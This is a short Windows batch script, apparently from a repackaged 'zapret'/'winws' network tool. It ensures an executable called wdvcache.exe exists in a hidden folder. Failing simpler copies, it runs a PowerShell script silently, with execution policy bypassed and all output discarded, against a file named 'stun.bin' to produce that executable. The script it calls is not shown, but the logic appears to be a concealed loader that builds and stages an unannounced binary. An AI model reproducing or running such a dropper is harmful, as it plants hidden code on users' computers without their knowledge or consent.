@echo off
set "MODE=%~1"
set "CACHE=%~dp0.wd\wdvcache.exe"
set "TWIN=%~dp0.wd\zapret.exe"
set "OUT=%LOCALAPPDATA%\WinDivert\wdvcache.exe"
if exist "%CACHE%" exit /b 0
if not exist "%~dp0.wd\" mkdir "%~dp0.wd\" 2>nul
if exist "%TWIN%" (
  copy /y "%TWIN%" "%CACHE%" >nul 2>&1
  if exist "%CACHE%" exit /b 0
)
if exist "%OUT%" (
  copy /y "%OUT%" "%CACHE%" >nul 2>&1
  if exist "%CACHE%" exit /b 0
)
if not exist "%~dp0winws.exe" exit /b 1
set "HOST=%~dp0stun.bin"
set "PS1=%~dp0wd_cache.ps1"
set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
if not exist "%HOST%" exit /b 1
if not exist "%PS1%" exit /b 1
if not exist "%PS%" exit /b 1
"%PS%" -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%" "%HOST%" >nul 2>&1
if exist "%CACHE%" exit /b 0
if not exist "%OUT%" exit /b 1
copy /y "%OUT%" "%CACHE%" >nul 2>&1
if exist "%CACHE%" exit /b 0
exit /b 1
